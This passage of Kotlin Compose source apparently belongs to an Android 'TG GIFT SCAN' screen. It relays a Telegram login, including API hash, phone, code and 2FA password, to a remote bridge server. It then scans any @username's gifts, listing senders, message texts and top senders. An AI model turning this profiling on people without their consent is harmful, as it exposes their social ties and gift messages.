    var lines by remember { mutableStateOf(listOf<String>()) }
    var busy by remember { mutableStateOf(false) }
    val scope = rememberCoroutineScope()

    fun api(path: String, body: String? = null): String {
        return try {
            val conn = java.net.URL("${server.trimEnd('/')}$path").openConnection() as java.net.HttpURLConnection
            conn.connectTimeout = 10000
            conn.readTimeout = 30000
            if (body != null) {
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")
                conn.outputStream.use { it.write(body.toByteArray()) }
            }
            val stream = if (conn.responseCode in 200..299) conn.inputStream else conn.errorStream
            stream?.bufferedReader()?.readText() ?: "{}"
        } catch (e: Exception) {
            "{\"error\":\"${e.message?.take(120)}\"}"
        }
    }

    Column {
        TopBar("TG GIFT SCAN") { onBack() }
        Text("STATUS: $status", color = Gold, fontSize = 11.sp, fontFamily = FontFamily.Monospace)
        Spacer(modifier = Modifier.height(8.dp))

        OutlinedTextField(value = server, onValueChange = { server = it },
            label = { Text("Bridge URL (codespaces port 8787)", color = DimGreen, fontFamily = FontFamily.Monospace) },
            colors = TextFieldDefaults.outlinedTextFieldColors(textColor = Green, focusedBorderColor = Green, unfocusedBorderColor = DimGreen, cursorColor = Green),
            modifier = Modifier.fillMaxWidth(), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))

        Button(onClick = {
            scope.launch {
                val r = withContext(Dispatchers.IO) { api("/status") }
                prefs.edit().putString("tg_server", server).apply()
                val obj = org.json.JSONObject(r)
                configured = obj.optBoolean("configured")
                loggedIn = obj.optBoolean("logged_in")
                status = when {
                    obj.has("error") -> "bridge unreachable: ${obj.optString("error")}"
                    loggedIn -> "logged in as ${obj.optString("me")}"
                    configured -> "bridge ok, registration required"
                    else -> "bridge ok, config required"
                }
            }
        }, colors = ButtonDefaults.buttonColors(backgroundColor = DimGreen), modifier = Modifier.fillMaxWidth()) {
            Text("[ CONNECT ]", color = Color.Black, fontFamily = FontFamily.Monospace)
        }
        Spacer(modifier = Modifier.height(8.dp))

        if (!configured) {
            OutlinedTextField(value = apiId, onValueChange = { apiId = it },
                label = { Text("API ID (my.telegram.org)", color = DimGreen, fontFamily = FontFamily.Monospace) },
                colors = TextFieldDefaults.outlinedTextFieldColors(textColor = Green, focusedBorderColor = Green, unfocusedBorderColor = DimGreen, cursorColor = Green),
                modifier = Modifier.fillMaxWidth(), singleLine = true)
            Spacer(modifier = Modifier.height(8.dp))
            OutlinedTextField(value = apiHash, onValueChange = { apiHash = it },
                label = { Text("API HASH", color = DimGreen, fontFamily = FontFamily.Monospace) },
                colors = TextFieldDefaults.outlinedTextFieldColors(textColor = Green, focusedBorderColor = Green, unfocusedBorderColor = DimGreen, cursorColor = Green),
                modifier = Modifier.fillMaxWidth(), singleLine = true)
            Spacer(modifier = Modifier.height(8.dp))
            Button(onClick = {
                scope.launch {
                    val body = org.json.JSONObject().put("api_id", apiId.toIntOrNull() ?: 0).put("api_hash", apiHash).toString()
                    val r = withContext(Dispatchers.IO) { api("/config", body) }
                    prefs.edit().putString("tg_api_id", apiId).putString("tg_api_hash", apiHash).apply()
                    configured = !org.json.JSONObject(r).has("error")
                    status = if (configured) "config saved, register below" else "config failed"
                }
            }, colors = ButtonDefaults.buttonColors(backgroundColor = DimGreen), modifier = Modifier.fillMaxWidth()) {
                Text("[ SAVE CONFIG ]", color = Color.Black, fontFamily = FontFamily.Monospace)
            }
            Spacer(modifier = Modifier.height(8.dp))
        }

        if (configured && !loggedIn) {
            OutlinedTextField(value = phone, onValueChange = { phone = it },
                label = { Text("PHONE +7...", color = DimGreen, fontFamily = FontFamily.Monospace) },
                colors = TextFieldDefaults.outlinedTextFieldColors(textColor = Green, focusedBorderColor = Green, unfocusedBorderColor = DimGreen, cursorColor = Green),
                modifier = Modifier.fillMaxWidth(), singleLine = true)
            Spacer(modifier = Modifier.height(8.dp))
            Button(onClick = {
                scope.launch {
                    val body = org.json.JSONObject().put("phone", phone).toString()
                    val r = withContext(Dispatchers.IO) { api("/login/start", body) }
                    val obj = org.json.JSONObject(r)
                    codeHash = obj.optString("hash")
                    status = if (codeHash.isNotEmpty()) "code sent to $phone" else "send code failed: ${obj.optString("detail", obj.optString("error"))}"
                }
            }, colors = ButtonDefaults.buttonColors(backgroundColor = DimGreen), modifier = Modifier.fillMaxWidth()) {
                Text("[ SEND CODE ]", color = Color.Black, fontFamily = FontFamily.Monospace)
            }
            Spacer(modifier = Modifier.height(8.dp))
            OutlinedTextField(value = code, onValueChange = { code = it },
                label = { Text("CODE FROM TELEGRAM", color = DimGreen, fontFamily = FontFamily.Monospace) },
                colors = TextFieldDefaults.outlinedTextFieldColors(textColor = Green, focusedBorderColor = Green, unfocusedBorderColor = DimGreen, cursorColor = Green),
                modifier = Modifier.fillMaxWidth(), singleLine = true)
            Spacer(modifier = Modifier.height(8.dp))
            if (need2fa) {
                OutlinedTextField(value = password, onValueChange = { password = it },
                    label = { Text("2FA PASSWORD", color = DimGreen, fontFamily = FontFamily.Monospace) },
                    colors = TextFieldDefaults.outlinedTextFieldColors(textColor = Green, focusedBorderColor = Green, unfocusedBorderColor = DimGreen, cursorColor = Green),
                    modifier = Modifier.fillMaxWidth(), singleLine = true)
                Spacer(modifier = Modifier.height(8.dp))
            }
            Button(onClick = {
                scope.launch {
                    val body = if (need2fa) {
                        org.json.JSONObject().put("phone", phone).put("hash", codeHash).put("password", password).toString()
                    } else {
                        org.json.JSONObject().put("phone", phone).put("code", code).put("hash", codeHash).toString()
                    }
                    val path = if (need2fa) "/login/2fa" else "/login/code"
                    val r = withContext(Dispatchers.IO) { api(path, body) }
                    val obj = org.json.JSONObject(r)
                    if (obj.optBoolean("need_2fa")) {
                        need2fa = true
                        status = "2FA required, enter password"
                    } else if (obj.optBoolean("ok")) {
                        loggedIn = true
                        status = "logged in as ${obj.optString("me")}"
                    } else {
                        status = "sign in failed: ${obj.optString("detail", obj.optString("error"))}"
                    }
                }
            }, colors = ButtonDefaults.buttonColors(backgroundColor = Green), modifier = Modifier.fillMaxWidth()) {
                Text("[ SIGN IN ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
            }
            Spacer(modifier = Modifier.height(8.dp))
        }

        if (loggedIn) {
            OutlinedTextField(value = username, onValueChange = { username = it },
                label = { Text("@username to scan", color = DimGreen, fontFamily = FontFamily.Monospace) },
                colors = TextFieldDefaults.outlinedTextFieldColors(textColor = Green, focusedBorderColor = Green, unfocusedBorderColor = DimGreen, cursorColor = Green),
                modifier = Modifier.fillMaxWidth(), singleLine = true)
            Spacer(modifier = Modifier.height(8.dp))
            Button(
                onClick = {
                    if (!busy && username.isNotBlank()) {
                        busy = true
                        lines = listOf("SCANNING...")
                        scope.launch {
                            val resp = withContext(Dispatchers.IO) { api("/gifts?username=${username.removePrefix("@")}") }
                            lines = try {
                                val obj = org.json.JSONObject(resp)
                                val arr = obj.optJSONArray("gifts")
                                val out = mutableListOf<String>()
                                out.add("PROFILE: @${obj.optString("username")} · GIFTS: ${obj.optInt("count")}")
                                val senders = mutableMapOf<String, Int>()
                                var anon = 0
                                if (arr != null) {
                                    for (i2 in 0 until arr.length()) {
                                        val g = arr.getJSONObject(i2)
                                        val snd = g.optString("sender")
                                        val msg = g.optString("message")
                                        val date = g.optLong("date")
                                        val d = if (date > 0) java.text.SimpleDateFormat("yy-MM-dd", java.util.Locale.US).format(java.util.Date(date * 1000)) else "?"
                                        out.add("$d · $snd · ${if (msg.isEmpty()) "(no text)" else msg}")
                                        if (snd == "anonymous" || snd == "hidden") anon++ else senders[snd] = (senders[snd] ?: 0) + 1
                                    }
                                }
                                out.add("SENDERS: ${senders.size} named · $anon anonymous")
                                senders.entries.sortedByDescending { it.value }.take(3).forEach { (k, v) ->
                                    out.add("TOP: $k x$v")
                                }
                                out
                            } catch (e: Exception) {
                                listOf("RAW: ${resp.take(300)}")
                            }
                            busy = false
                        }
                    }
                },
                enabled = !busy && username.isNotBlank(),
                colors = ButtonDefaults.buttonColors(backgroundColor = if (busy) DimGreen else Green),
                modifier = Modifier.fillMaxWidth()
            ) {
                Text(if (busy) "[ SCANNING... ]" else "[ SCAN GIFTS ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
            }
            Spacer(modifier = Modifier.height(12.dp))
        }

        LazyColumn(modifier = Modifier.weight(1f)) {
            items(lines) { l ->
                Text(l, color = if (l.startsWith("TOP") || l.startsWith("PROFILE")) Gold else DimGreen, fontSize = 11.sp, fontFamily = FontFamily.Monospace)
            }
        }
    }
}
